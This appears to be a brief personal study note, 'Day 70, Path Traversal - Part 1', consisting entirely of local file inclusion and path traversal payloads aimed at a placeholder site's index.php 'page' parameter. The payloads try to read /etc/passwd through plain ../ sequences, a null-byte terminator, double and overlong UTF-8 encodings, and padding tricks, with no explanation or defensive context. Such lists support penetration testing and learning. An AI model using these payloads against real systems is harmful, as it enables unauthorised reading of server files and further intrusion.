Daily Notes : Day 70  
Path Traversal - Part 1

Basic LFI:  
Http://&lt;target&gt;.com/index.php?page=../../../etc/passwd

Null byte:  
http://&lt;target&gt;.com/index.php?page=../../../etc/passwd%00

Encoding:

http://&lt;domain&gt;.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd

http://&lt;domain&gt;.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

http://&lt;domain&gt;.com/index.php?page=%25252e%25252e%25252fetc%25252fpasswd%2500

http://&lt;domain &gt;.com/index.php?page=a/./.(ADDMORE ../)/etc/passwd

http://&lt;domain &gt;.com/index.php?page=a/../../../../(ADDMORE ../)../../../../../etc/passwd